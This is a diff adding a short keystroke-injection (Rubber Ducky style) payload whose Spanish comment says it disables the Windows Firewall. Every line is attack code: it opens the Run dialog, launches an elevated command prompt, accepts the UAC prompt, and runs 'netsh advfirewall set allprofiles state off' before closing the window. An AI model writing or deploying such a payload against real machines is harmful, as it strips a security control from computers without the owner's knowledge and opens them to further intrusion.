@@ -1,0 +1,12 @@
+REM Deshabilitar el Firewall de Windows
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+CONTROL-SHIFT ENTER
+DELAY 1000
+ALT y
+STRING netsh advfirewall set allprofiles state off
+ENTER
+STRING exit
+ENTER
